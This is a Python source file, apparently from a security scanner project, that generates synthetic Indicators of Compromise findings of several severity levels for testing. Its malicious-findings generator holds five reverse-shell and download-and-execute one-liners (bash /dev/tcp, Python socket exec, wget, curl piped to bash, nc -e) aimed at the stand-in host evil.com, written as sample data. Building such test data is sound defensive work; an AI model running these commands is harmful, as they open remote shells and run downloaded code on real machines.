"""
IOC (Indicators of Compromise) producer for generating synthetic IOC findings.
"""

from typing import Dict, List, Any
import random
import uuid
from base_producer import BaseProducer

class IocProducer(BaseProducer):
    """Producer for synthetic IOC scanner findings."""

    def __init__(self):
        super().__init__("ioc")

    def _generate_normal_ioc(self) -> Dict[str, Any]:
        """Generate a normal IOC finding."""
        normal_processes = [
            "/usr/bin/gnome-shell",
            "/usr/bin/nautilus",
            "/usr/bin/firefox",
            "/usr/bin/chrome",
            "/usr/bin/code"
        ]

        process_cmd = random.choice(normal_processes)
        pid = random.randint(1000, 9999)

        return {
            "id": f"ioc_{uuid.uuid4().hex[:8]}",
            "title": "Process IOC Detected",
            "severity": "info",
            "risk_score": 10,
            "base_severity_score": 10,
            "description": f"Normal process detected: {process_cmd}",
            "metadata": {
                "command": process_cmd,
                "pid": str(pid),
                "pattern_match": "false"
            },
            "operational_error": False,
            "category": "ioc",
            "tags": ["process", "ioc", "normal"],
            "risk_subscores": {
                "impact": random.uniform(0.01, 0.05),
                "exposure": random.uniform(0.01, 0.03),
                "anomaly": random.uniform(0.05, 0.15),
                "confidence": random.uniform(0.8, 0.9)
            },
            "correlation_refs": [],
            "baseline_status": "existing",
            "severity_source": "raw",
            "allowlist_reason": None,
            "probability_actionable": random.uniform(0.001, 0.01),
            "graph_degree": None,
            "cluster_id": None,
            "rationale": None,
            "risk_total": 10,
            "host_role": None,
            "host_role_rationale": None,
            "metric_drift": None
        }

    def _generate_suspicious_ioc(self) -> Dict[str, Any]:
        """Generate a suspicious IOC finding."""
        suspicious_processes = [
            "/usr/bin/nmap",
            "/usr/bin/wireshark",
            "/usr/bin/tcpdump",
            "/usr/bin/strace",
            "/usr/bin/lsof",
            "/usr/bin/netstat",
            "/usr/bin/ss",
            "/usr/bin/whoami",
            "/usr/bin/id",
            "/usr/bin/hostname"
        ]

        process_cmd = random.choice(suspicious_processes)
        pid = random.randint(1000, 9999)

        return {
            "id": f"ioc_{uuid.uuid4().hex[:8]}",
            "title": "Process IOC Detected",
            "severity": "low",
            "risk_score": 30,
            "base_severity_score": 30,
            "description": f"Process with suspicious patterns: {process_cmd}",
            "metadata": {
                "command": process_cmd,
                "pid": str(pid),
                "pattern_match": "true"
            },
            "operational_error": False,
            "category": "ioc",
            "tags": ["process", "ioc", "suspicious", "reconnaissance"],
            "risk_subscores": {
                "impact": random.uniform(0.1, 0.3),
                "exposure": random.uniform(0.2, 0.4),
                "anomaly": random.uniform(0.3, 0.6),
                "confidence": random.uniform(0.6, 0.8)
            },
            "correlation_refs": [],
            "baseline_status": "existing",
            "severity_source": "raw",
            "allowlist_reason": None,
            "probability_actionable": random.uniform(0.05, 0.15),
            "graph_degree": None,
            "cluster_id": None,
            "rationale": None,
            "risk_total": 30,
            "host_role": None,
            "host_role_rationale": None,
            "metric_drift": None
        }

    def _generate_malicious_ioc(self) -> Dict[str, Any]:
        """Generate a malicious IOC finding."""
        malicious_processes = [
            "/bin/bash -i >& /dev/tcp/evil.com/4444 0>&1",
            "/usr/bin/python3 -c 'import socket; s=socket.socket(); s.connect((\"evil.com\",4444)); exec(s.recv(1024).decode())'",
            "/usr/bin/wget http://evil.com/malware -O /tmp/malware && chmod +x /tmp/malware && /tmp/malware",
            "/usr/bin/curl http://evil.com/shell | bash",
            "/usr/bin/nc -e /bin/bash evil.com 4444"
        ]

        process_cmd = random.choice(malicious_processes)
        pid = random.randint(1000, 9999)

        return {
            "id": f"ioc_{uuid.uuid4().hex[:8]}",
            "title": "Process IOC Detected",
            "severity": "high",
            "risk_score": 80,
            "base_severity_score": 80,
            "description": f"Process with malicious indicators: {process_cmd[:50]}...",
            "metadata": {
                "command": process_cmd,
                "pid": str(pid),
                "pattern_match": "true"
            },
            "operational_error": False,
            "category": "ioc",
            "tags": ["process", "ioc", "malicious", "compromise"],
            "risk_subscores": {
                "impact": random.uniform(0.7, 0.95),
                "exposure": random.uniform(0.8, 0.95),
                "anomaly": random.uniform(0.8, 0.95),
                "confidence": random.uniform(0.85, 0.95)
            },
            "correlation_refs": [],
            "baseline_status": "existing",
            "severity_source": "raw",
            "allowlist_reason": None,
            "probability_actionable": random.uniform(0.7, 0.95),
            "graph_degree": None,
            "cluster_id": None,
            "rationale": None,
            "risk_total": 80,
            "host_role": None,
            "host_role_rationale": None,
            "metric_drift": None
        }

    def _generate_deleted_executable_ioc(self) -> Dict[str, Any]:
        """Generate a deleted executable IOC finding."""
        deleted_executables = [
            "/usr/bin/sshd (deleted)",
            "/usr/sbin/apache2 (deleted)",
            "/usr/bin/python3 (deleted)",
            "/bin/bash (deleted)",
            "/usr/bin/vim (deleted)"
        ]

        process_cmd = random.choice(deleted_executables)
        pid = random.randint(1000, 9999)

        return {
            "id": f"ioc_{uuid.uuid4().hex[:8]}",
            "title": "Process IOC Detected",
            "severity": "critical",
            "risk_score": 90,
            "base_severity_score": 90,
            "description": f"Process with deleted executable: {process_cmd}",
            "metadata": {
                "command": process_cmd,
                "pid": str(pid),
                "deleted_executable": "true"
            },
            "operational_error": False,
            "category": "ioc",
            "tags": ["process", "ioc", "critical", "deleted", "stealth"],
            "risk_subscores": {
                "impact": random.uniform(0.8, 0.95),
                "exposure": random.uniform(0.9, 0.95),
                "anomaly": random.uniform(0.9, 0.95),
                "confidence": random.uniform(0.9, 0.95)
            },
            "correlation_refs": [],
            "baseline_status": "existing",
            "severity_source": "raw",
            "allowlist_reason": None,
            "probability_actionable": random.uniform(0.8, 0.95),
            "graph_degree": None,
            "cluster_id": None,
            "rationale": None,
            "risk_total": 90,
            "host_role": None,
            "host_role_rationale": None,
            "metric_drift": None
        }

    def _generate_world_writable_executable_ioc(self) -> Dict[str, Any]:
        """Generate a world-writable executable IOC finding."""
        world_writable_executables = [
            "/home/user/.vscode/extensions/ms-python.vscode-python-envs/bin/pet",
            "/tmp/test_executable",
            "/var/tmp/malicious_binary",
            "/dev/shm/suspicious_script",
            "/run/user/1000/malware"
        ]

        process_cmd = random.choice(world_writable_executables)
        pid = random.randint(1000, 9999)

        return {
            "id": f"ioc_{uuid.uuid4().hex[:8]}",
            "title": "Process IOC Detected",
            "severity": "high",
            "risk_score": 70,
            "base_severity_score": 70,
            "description": f"Process with world-writable executable: {process_cmd}",
            "metadata": {
                "command": process_cmd,
                "pid": str(pid),
                "world_writable_executable": "true"
            },
            "operational_error": False,
            "category": "ioc",
            "tags": ["process", "ioc", "high", "world_writable", "tampering"],
            "risk_subscores": {
                "impact": random.uniform(0.6, 0.8),
                "exposure": random.uniform(0.7, 0.9),
                "anomaly": random.uniform(0.8, 0.95),
                "confidence": random.uniform(0.8, 0.9)
            },
            "correlation_refs": [],
            "baseline_status": "existing",
            "severity_source": "raw",
            "allowlist_reason": None,
            "probability_actionable": random.uniform(0.5, 0.8),
            "graph_degree": None,
            "cluster_id": None,
            "rationale": None,
            "risk_total": 70,
            "host_role": None,
            "host_role_rationale": None,
            "metric_drift": None
        }

    def generate_findings(self, count: int) -> List[Dict[str, Any]]:
        """Generate the specified number of IOC findings."""
        findings = []

        for _ in range(count):
            scenario = self._choose_scenario()

            if scenario == "normal":
                finding = self._generate_normal_ioc()
            elif scenario == "suspicious":
                finding = self._generate_suspicious_ioc()
            elif scenario == "malicious":
                finding = self._generate_malicious_ioc()
            elif scenario == "edge_case":
                # Randomly choose between deleted executable and world-writable
                if random.random() < 0.5:
                    finding = self._generate_deleted_executable_ioc()
                else:
                    finding = self._generate_world_writable_executable_ioc()

            findings.append(finding)

        return findings